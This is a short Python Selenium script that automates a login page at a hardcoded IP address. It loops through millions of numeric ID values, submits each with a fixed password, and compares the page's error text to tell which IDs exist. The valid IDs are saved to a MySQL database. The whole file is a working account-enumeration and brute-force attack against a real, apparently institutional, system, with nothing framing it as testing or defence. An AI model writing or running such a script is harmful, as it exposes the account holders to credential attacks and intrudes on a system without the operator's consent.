from selenium import webdriver
from MySQLCommand import MySQLCommand

browser = webdriver.Chrome()
browser.get('http://60.219.165.24')

mysqlCommand = MySQLCommand()
mysqlCommand.connectMysql()


for i in range(2003808010, 2016026399):
    username = browser.find_element_by_name('zjh')
    username.send_keys(i)
    username = browser.find_element_by_name('mm')
    username.send_keys('23333')
    btn = browser.find_element_by_id('btnSure')
    btn.click()
    message = browser.find_elements_by_xpath('//td[@class="errorTop"]')[0].text
    if message == "你输入的证件号不存在，请您重新输入！":
        continue
    else:
        mysqlCommand.insertData_id(i)
        print(i)



